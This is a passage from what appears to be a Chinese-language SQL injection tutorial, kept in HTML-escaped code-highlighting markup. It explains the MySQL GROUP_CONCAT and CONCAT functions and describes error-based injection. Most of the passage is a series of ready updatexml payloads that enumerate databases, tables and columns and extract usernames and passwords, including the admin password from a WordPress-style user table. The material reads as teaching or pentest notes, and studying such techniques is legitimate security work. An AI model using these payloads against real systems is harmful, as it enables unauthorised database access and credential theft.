class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x3c62723e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))))&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;**GROUP_CONCAT **&lt;/p&gt;
&lt;p&gt;GROUP_CONCAT(expr) ——从 expr 中&lt;strong&gt;连接所有非 NULL 的字符串&lt;/strong&gt;。如果没有非 NULL 的字符串，那么它就会返回 NULL&lt;/p&gt;
&lt;p&gt;系统变量group_concat_max_len控制允许返回的最大字节长度，默认值为1M(&amp;gt;= MariaDB 10.2.4)或1K(&amp;lt;= MariaDB 10.2.3)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;GROUP_CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;DISTINCT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;expr&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;expr&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ORDER&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;BY&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unsigned_integer&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;col_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;expr&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                 &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ASC&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;DESC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;col_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...]]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SEPARATOR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str_val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SEPARATOR指定串联各值时使用的分隔符&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。默认分隔符为逗号&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(,)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;CONCAT&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将多个字符串连接为一个字符串，如果当中有一个NULL，返回结果即为NULL&lt;/p&gt;
&lt;h2 id=&#34;显错注入&#34;&gt;显错注入&lt;/h2&gt;
&lt;h3 id=&#34;主要分类&#34;&gt;主要分类&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigInt 等数据类型溢出&lt;/li&gt;
&lt;li&gt;Xpath 语法错误&lt;/li&gt;
&lt;li&gt;count() + rand() + group by 导致主键重复&lt;/li&gt;
&lt;li&gt;空间数据类型函数错误&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;updatexml-和-extractvalue&#34;&gt;updatexml 和 extractvalue&lt;/h3&gt;
&lt;p&gt;MySQL版本&amp;gt;5.1添加了对XML文档修改和查询的函数&lt;strong&gt;updatexml 和 extractvalue&lt;/strong&gt;，二者报错原理类似&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;updatexml() (返回替换的XML片段) 和 extractvalue()(使用XPath表示法从XML字符串中提取值)第二个参数需要传入的是 Xpath 格式的字符串。输入不符合，将参数值返回并报错。&lt;/p&gt;
&lt;p&gt;报错长度最大为 32 位&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;显示当前数据库&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;显示所有数据库&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;schema_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;INFORMATION_SCHEMA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SCHEMATA&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;获取表名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sectest&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;make_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;获取列名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;COLUMNS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;wp_user_&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;make_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;columns&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;users&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;获取数据&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wp_user_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wp_user_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GROUP_CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x3a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wp_user_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;make_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span 